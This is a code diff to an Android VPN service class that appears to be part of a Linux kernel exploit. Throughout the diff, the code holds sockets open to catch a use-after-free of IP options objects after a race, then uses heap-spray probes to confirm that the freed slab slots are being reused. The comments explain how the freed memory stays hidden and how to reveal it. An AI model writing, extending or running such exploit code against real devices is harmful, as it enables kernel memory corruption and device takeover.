@@ -148,6 +148,13 @@ public class InjService extends VpnService {
 
     /** True once the native race writers are running on the tun fd. */
     private volatile boolean raceReady = false;
+
+    /**
+     * Accepted children kept open so their inherited options can be re-read
+     * after the slab slot underneath them has been reused.
+     */
+    private final int[] childRing = {-1, -1, -1, -1, -1, -1, -1, -1};
+    private int childRingPos = 0;
     private ParcelFileDescriptor tun;
     private ServerSocket listener;
 
@@ -469,7 +476,28 @@ public class InjService extends VpnService {
     private void answerProbe(OutputStream out, int count) {
         String result;
         try {
+            // Read the retained children before and after the churn.
+            //
+            // Freeing an ip_options_rcu does not change the bytes that
+            // getsockopt returns: SLUB only writes its freepointer at offset 0,
+            // while optlen lives at offset 24 and the option data after it. So a
+            // dangling child still reports len=40 with the original payload and
+            // looks perfectly healthy.
+            //
+            // The only way to see the difference is to hand the slab slot to
+            // somebody else first. probeHeap allocates a batch of options
+            // objects with distinct tags; if a child's pointer was dangling, one
+            // of those tags now sits where the child's option bytes used to be.
+            String before = readChildRing();
             result = Native.probeHeap(count);
+            String after = readChildRing();
+
+            if (!before.equals(after)) {
+                Log.w(TAG, "CHILD UAF: retained child changed after churn; before="
+                        + before + " after=" + after);
+            }
+
+            result = result + " | before=" + before + " after=" + after;
         } catch (Throwable t) {
             result = "probe error: " + t;
         }
@@ -492,6 +520,32 @@ public class InjService extends VpnService {
         } catch (Exception e) {
             Log.w(TAG, "probe reply failed: " + e);
         }
+    }
+
+    private void retainChild(int child) {
+        int evicted = -1;
+        synchronized (childRing) {
+            evicted = childRing[childRingPos];
+            childRing[childRingPos] = child;
+            childRingPos = (childRingPos + 1) % childRing.length;
+        }
+        if (evicted >= 0) {
+            Native.closeFd(evicted);
+        }
+    }
+
+    /** Snapshot of what the retained children currently report for IP_OPTIONS. */
+    private String readChildRing() {
+        StringBuilder sb = new StringBuilder();
+        synchronized (childRing) {
+            for (int fd : childRing) {
+                if (fd < 0) {
+                    continue;
+                }
+                sb.append(Native.readFdOptions(fd)).append(';');
+            }
+        }
+        return sb.toString();
     }
 
     /**
@@ -546,7 +600,14 @@ public class InjService extends VpnService {
                         + " last=" + opts);
             }
 
-            Native.closeFd(child);
+            // Hand the child to the ring instead of closing it straight away.
+            //
+            // A child whose request socket lost the ehash race keeps a pointer
+            // to an options object that was already freed, but the bytes still
+            // read back correctly until something else claims the slab slot.
+            // Holding a few children open lets the probe re-read them after
+            // forcing that reuse.
+            retainChild(child);
         }
 
         Log.i(TAG, "attack accept loop ended, accepted=" + accepted
